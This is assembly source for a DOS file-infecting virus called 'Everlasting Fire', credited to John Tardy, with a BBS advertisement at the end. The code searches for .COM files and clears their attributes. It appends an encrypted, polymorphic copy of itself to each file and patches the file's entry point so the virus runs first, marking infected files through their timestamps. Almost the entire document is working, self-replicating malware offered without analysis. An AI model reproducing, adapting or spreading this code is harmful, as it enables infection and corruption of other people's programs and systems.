;
; Everlasting Fire Virus by John Tardy
;

                Org 100h

Jump:           Jmp Virus

Decr:
Instr:          db 'Generation'
Loopje          DB 0e2h
                db 0fah
DecrLen         Equ $-Decr
Crypt:
Virus:          Push Ax
                Call GetOfs
GetOfs:         Pop Ax
                Sub Ax,GetOfs
                Mov Bp,Ax

                Lea Si,OrgPrg[BP]
                Mov Di,100h
                Movsw
                Movsb

                Mov Ah,1ah
                Mov Dx,0f900h
                Int 21h

                Mov Ah,4eh
Search:         Lea Dx,FileSpec[BP]
                Xor Cx,Cx
                Int 21h
                Jnc Found

Ready:          Mov Ah,1ah
                Mov Dx,80h
                Int 21h

                Mov Bx,100h
                Pop Ax
                Push Bx
                Ret

Found:          Mov Ax,4300h
                Mov Dx,0f91eh
                Int 21h

                Push Cx
                Mov Ax,4301h
                Xor Cx,Cx
                Int 21h

                Mov Ax,3d02h
                Int 21h
                Mov Bx,5700h
                Xchg Ax,Bx
                Int 21h
                Push Cx
                Push Dx
                And Cx,1fh
                Cmp Cx,1
                Jne CheckExe
                Jmp ExeFile

CheckExe:       Mov Ah,3fh
                Lea Dx,OrgPrg[BP]
                Mov Cx,3
                Int 21h
                Mov Ax,Cs:[OrgPrg][BP]
                Cmp Ax,'MZ'
                Je ExeFile
                Cmp Ax,'ZM'
                Je ExeFile
                Pop Dx
                Pop Cx
                And Cx,0ffe0h
                Or Cx,1
                Push Cx
                Push Dx

Infect:
                Mov Ax,4202h
                Call FSeek
                Sub Ax,3
                Mov Cs:CallPtr[BP]+1,Ax
                Add Ax,Offset Crypt
                Mov S_1[Bp+1],Ax
                Mov S_2[Bp+1],Ax
                Mov S_3[Bp+4],Ax
                Mov S_4[Bp+4],Ax
                Call GenPoly

                Mov Ah,40h
                Lea Dx,0fa00h
                Mov Cx,VirLen
                Int 21h
                Mov Ax,4200h
                Call FSeek
                Mov Ah,40h
                Lea Dx,CallPtr[BP]
                Mov Cx,3
                Int 21h
                Call Close
                Jmp Ready


ExeFile:        Call Close
                Mov Ah,4fh
                Jmp Search
FSeek:          Xor Cx,Cx
                Xor Dx,Dx
                Int 21h
                Ret

Close:          Pop Si
                Pop Dx
                Pop Cx
                Mov Ax,5701h
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ax,4301h
                Pop Cx
                Mov Dx,0fc1eh
                Int 21h
                Push Si
                Ret

                Db 13,10,'Mourners of a dying world'
                Db 13,10,'Too late to reconcile'
                Db 13,10,'Into Everlasting Fire'
                Db 13,10,'Can''t you see it''s Satan''s world'

GenPoly:        Xor Byte Ptr [Loopje][Bp],2
                Xor Ax,Ax
                Mov Es,Ax
                Mov Ax,Es:[46ch]
;                Xor Ax,Ax               ; DEZE ERUIT!!!
                Mov Es,Cs
                Push Ax
                And Ax,07ffh
                Add Ax,CryptLen
                Mov S_1[Bp+4],Ax
                Mov S_2[Bp+4],Ax
                Mov S_3[Bp+1],Ax
                Mov S_4[Bp+1],Ax
Doit:           Pop Ax
                Push Ax
                And Ax,3
                Shl Ax,1
                Mov Si,Ax
                Mov Ax,Word Ptr Table[Si][Bp]
                Add Ax,Bp
                Mov Si,Ax
                Lea Di,Instr[Bp]
                Movsw
                Movsw
                Movsw
                Movsw
                Pop Ax
                Stosb
                Movsb
                Mov Dl,Al
                Lea Si,Decr[BP]
                Mov Di,0fa00h
                Mov Cx,DecrLen
                Rep Movsb
                Lea Si,Crypt[BP]
                Mov Cx,CryptLen
Encrypt:        Lodsb
                Xor Al,Dl
                Stosb
                Loop Encrypt
                Cmp Dl,0
                Je  Fuckit
                Ret

FuckIt:         Lea Si,Encr0
                Mov Di,0fa00h
                Mov Cx,Encr0Len
                Rep Movsb
                Mov Ax,Cs:CallPtr[BP]+1
                Add Ax,Encr0Len+2
                Mov Cs:CallPtr[BP]+1,Ax
                Ret

                DB 'TRIDENT'

Table           DW Offset S_1
                DW Offset S_2
                DW Offset S_3
                DW Offset S_4

S_1:            Lea Si,0
                Mov Cx,0
                DB 80h,34h
                Inc Si
S_2:            Lea Di,0
                Mov Cx,0
                DB 80h,35h
                Inc Di
S_3:            Mov Cx,0
                Lea Si,0
                DB 80h,34h
                Inc Si
S_4:            Mov Cx,0
                Lea Di,0
                DB 80h,35h
                Inc Di

Encr0           Db 'John Tardy'
Encr0Len        Equ $-Encr0

CallPtr         Db 0e9h,0,0

FileSpec        Db '*.CoM',0

OrgPrg:         Int 20h
                Db '!'

CryptLen        Equ $-Crypt

VirLen          Equ $-Decr



;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄ> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <ÄÄÄÄÄÄÄÄÄÄÄ
;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
